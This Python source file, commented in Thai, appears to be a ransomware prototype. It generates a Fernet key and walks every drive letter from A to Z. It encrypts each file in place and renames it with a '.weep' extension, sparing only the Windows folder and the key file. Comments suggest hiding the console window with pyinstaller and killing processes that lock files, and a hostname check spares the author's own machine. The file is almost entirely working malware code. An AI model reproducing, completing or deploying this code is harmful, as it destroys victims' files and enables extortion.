import os, subprocess, time
from cryptography.fernet import Fernet
#อาจจะต้อง task kill process ที่ไม่ใช่เราทเเละ window ทั้งหมดด้วย เพื่อ ให้ไม่เออเร่อว่ากำลังอ่านไฟล์อยู่
#ไม่ให้จอ cmd เด้งออกมา pyinstaller --noconsole --onefile 
#ใส่เบรกว่าถ้าชื่อเครื่องเป็นเรา ไม่รัน
class encrypt(object):
    """
    docstring
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)
        with open('keyfile.txt','wb+') as f:
            f.write(self.key)

    @staticmethod
    def generatedirlist():
        """
        generate a to z and call findext every loop from a to z
        using drives parameter
        """
        for i in range(65,65+26):
            yield chr(i)+":\\"

    def encrypt(self,data):
        return self.cryptor.encrypt(data)
    def FindMainDrive(self):# Stable!
        """
        return a letter that is a system drive.
        """
        cmd ="echo %SystemRoot%"
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True) # return CompletedProcess Class
        if p.stderr!="":
            print(p.stderr)
            print('program terminated in 5 sec')
            time.sleep(5)
            exit()
        return p.stdout.split(':')[0]    

    def run(self):
        """
        this should encrypt all drive except drive c
        run this first
        then run encrypt c
        """
        exclude = self.FindMainDrive()
        path = [i for i in encrypt.generatedirlist() if i.lower() != exclude.lower()+':\\']
        for i in path:
            for root,_,files in os.walk(i):
                for name in files:
                    if name!='keyfile.txt':
                        walkingdir = os.path.join(root,name)
                        # ########################################TESTTESTTESTTEST
                        # เทสว่า keyfile.txt โดนเว้นจริงปาว ตอบ จริง เทสผ่านน Tested!!!
                        # with open('testencryptNOTC.txt','a',encoding='utf-8')as f:
                        #     f.write(walkingdir+'\n')
                        # #########################################TESTTESTTESTTEST
                        
                        #   use try block here with with block
                        try:
                            with open(walkingdir,'rb+') as f:
                                data = f.read()
                                f.seek(0)
                                f.truncate()
                                f.write(self.encrypt(data))
                            os.rename(walkingdir,walkingdir+'.weep')
                        except Exception as exception:
                            print(exception)
    def runinC(self):
        """
        This should encrypt maindrive except for Windows directory
        """
        OnlyDrive = self.FindMainDrive()
        exclude =set(['Windows']) #exclude these dir is working Tested!!!
        for root,dirs,files in os.walk(OnlyDrive+':\\'):
            dirs[:] = [d for d in dirs if d not in exclude]

            # with open('testExcludedir.txt','a',encoding='utf-8')as f:
            #     for name in files:
            #         f.write(os.path.join(root,name)+'\n')
            for name in files:
                    if name!='keyfile.txt':
                        walkingdir = os.path.join(root,name)
                        #   use try block here with with block
                        try:
                            with open(walkingdir,'rb+') as f:
                                data = f.read()
                                f.seek(0)
                                f.truncate()
                                f.write(self.encrypt(data))
                            os.rename(walkingdir,walkingdir+'.weep')
                        except Exception as exception:
                            print(exception)
    @staticmethod
    def EmergencyBreak():
        cmd ='hostname'
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True)
        return p.stdout[:-1]
        #DESKTOP-3E4AAU5
                
if __name__ == "__main__":
    try:
        if encrypt.EmergencyBreak()=='DESKTOP-3E4AAU5':
            exit()
        else:
            print('False')
    except Exception as exception:
        exit()

    # try:
    #     testobj = encrypt()
    #     testobj.run()
    #     testobj.runinC()
    # except Exception as exception:
    #     if os.path.exists('errorslog.txt'):
    #         writemode = 'a'
    #     else:
    #         writemode ='w'
    #     with open('errorslog.txt',writemode,encoding='utf-8')as f:
    #         f.write(exception+'\n')    